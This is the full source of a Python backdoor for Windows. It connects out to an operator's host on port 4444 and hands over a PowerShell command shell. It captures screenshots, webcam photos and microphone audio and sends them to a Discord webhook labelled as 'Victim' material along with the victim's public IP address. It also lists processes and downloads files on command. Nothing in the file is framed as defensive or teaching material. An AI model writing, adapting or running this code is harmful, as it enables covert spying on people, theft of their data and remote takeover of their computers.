import cv2
import os
import socket
import subprocess
import time
import psutil
import ctypes
import pynput
import requests
import pyautogui
from requests import get    
from termcolor import colored
from discord_webhook import DiscordWebhook, DiscordEmbed
from cv2 import VideoCapture
import sounddevice as sd
import wavio as wv
from cv2 import imshow, imwrite, destroyWindow, waitKey


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

ip = "192.168.1.5"
port = 4444
ipadd = get('https://api.ipify.org').text

class back:
    def help_desk(self):
        self.help_ = ("===========================================================\n"+
                    "|| 1.) bye              -- To close the session             ||\n"+
                    "|| 2.) screen -webhook  -- To take screenshot.              ||\n"+
                    "|| 3.) cam -webhook     -- To take webcam photo.            ||\n"+
                    "|| 4.) record t c web   -- To record sound from Mic.        ||\n"+
                    "|| 5.) list -id         -- To list the process id.          ||\n"+
                    "|| 6.) install          -- To install any program.          ||\n"
                    "===========================================================\n")
        s.send(self.help_.encode())

    def screenshot(self, url):
        webhook = DiscordWebhook(url=url)
        img = pyautogui.screenshot("1.png")
        with open("1.png", "rb") as f:
            webhook.add_file(file=f.read(), filename='1.png')
        embed = DiscordEmbed(title='Victim Screenshot',description=f'IP of the victim: {ipadd}',color='03fc30')
        webhook.add_embed(embed)
        response = webhook.execute()
        os.remove("1.png")

    def webcam(self, url):
        webhook = DiscordWebhook(url=url)
        cam = VideoCapture(0, cv2.CAP_DSHOW)
        result, image = cam.read()
        if result:   
            imwrite("2.png", image)
            waitKey(0)
            with open("2.png", "rb") as f:
                webhook.add_file(file=f.read(), filename='2.png')
            embed = DiscordEmbed(title='Victim Webcam Photo',description=f'IP of the victim: {ipadd}',color='1d0a26')
            webhook.add_embed(embed)
            response = webhook.execute()
            os.remove("2.png")
        else:
            s.send(b"No image detected. Please! try again")

    def process_id(self):
        num = 1
        for proc in psutil.process_iter():
            try:
                processName = proc.name()
                processID = proc.pid
                for_send = f"{num}. {processName} ::: {processID}\n"
                num +=1
                print(for_send)
                s.send(for_send.encode())
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

    def record_sound(self, time, channel, frequency, url):
        webhook = DiscordWebhook(url=url)
        freq = int(frequency)
        duration = int(time)
        main = freq * duration
        recording = sd.rec(int(freq * duration), samplerate=freq, channels=int(channel))

        sd.wait()
        wv.write("recording1.wav", recording, freq, sampwidth=2)
        with open("recording1.wav", "rb") as f:
            webhook.add_file(file=f.read(), filename='recording1.wav')
        embed = DiscordEmbed(title='Victim Mic Recording',description=f'IP of the victim: {ipadd}',color='1d0a26')
        webhook.add_embed(embed)
        response = webhook.execute()
        os.remove("recording1.wav")
                
    def shell(self):
        while True:
            s.send(b"\n[*] >>")
            cmd = s.recv(1024).decode()
            if cmd[:3] == "cd ":
                cmd = cmd[:-1]
                try:
                    os.chdir(cmd[3:])
                except:
                    continue
            
            elif (cmd[:3] == "bye"):
                s.send(b"Bye...\n")
                s.close()
                break
            
            elif (cmd[:6] == "screen"):
                time.sleep(0.5)
                fi = cmd[7:-1] 
                self.screenshot(fi)  

            elif (cmd[:6] == "webcam"):
                time.sleep(0.5)
                xi = cmd[7:-1]
                self.webcam(xi)
            
            elif (cmd[:4] == "list"):
                self.process_id()

            elif (cmd[:6] == "record"):
                s.send(b"\n[+] 44100 frequency is recommended!!\n[+] Channel 2 is recommended!!\n")
                ai = cmd[7:-1]
                c = ai.split(" ")
                self.record_sound(c[0], c[1], c[2], c[3])

            elif (cmd[:4] == "help"):
                self.help_desk()

            elif (cmd[:7] == "install"):
                try:
                    to_download = cmd[:-1]
                    self.download(to_download[4:])
                except:
                    s.send(b"\n[!] Can't Fetch the file!!\n")
            else:
                main = "powershell " + cmd
                try:
                    result = subprocess.getoutput(main)
                except:
                    continue
                s.send(result.encode())
        
    def download(self, url):
        get = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as file:
            file.write(get.content)

    def main(self):
        while True:
            try:
                s.connect((ip, port))
                if ctypes. windll. shell32. IsUserAnAdmin():
                    s.send(colored(b"\n[+]>> User is running the script as 'ADMIN'\n", "blue"))
                else:
                    n = colored("\n[-]>> User is running the script as 'NON-ADMIN'\n", "red")
                    s.send(n.encode())
                break
            except socket.error:
                time.sleep(3)
        banner = (
                    "\n==============================================\n"+
                    f"|| IP:      -- {ipadd}                 ||\n"+
                     "|| help     -- Shows extra commands         || \n"+
                     "==============================================\n")
        s.send(banner.encode())

        self.shell()

backdoor = back()
backdoor.main()
